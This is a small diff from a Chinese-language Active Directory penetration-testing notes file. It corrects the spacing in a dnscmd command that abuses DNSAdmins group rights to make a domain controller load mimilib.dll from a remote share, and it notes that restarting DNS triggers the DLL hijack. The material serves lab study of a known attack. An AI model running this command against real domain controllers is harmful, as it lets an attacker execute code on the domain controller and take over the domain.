@@ -948,7 +948,7 @@ kali编译成DLL文件：
 
 利用DNSAdmins group的组成员权限，使用dnscmd.exe (needs RSAT DNS)配置DNS的动态链接库
 ```
-dnscmd dcorp-dc /config /serverlevelplugindll\\172.16.50.66\dll\mimilib.dll
+dnscmd dcorp-dc /config /serverlevelplugindll \\172.16.50.66\dll\mimilib.dll
 ```
 重启DNS服务，使得dll劫持生效（不过这一定会影响公共域环境的DNS服务，不要在公共域环境做这个实验）
 ```
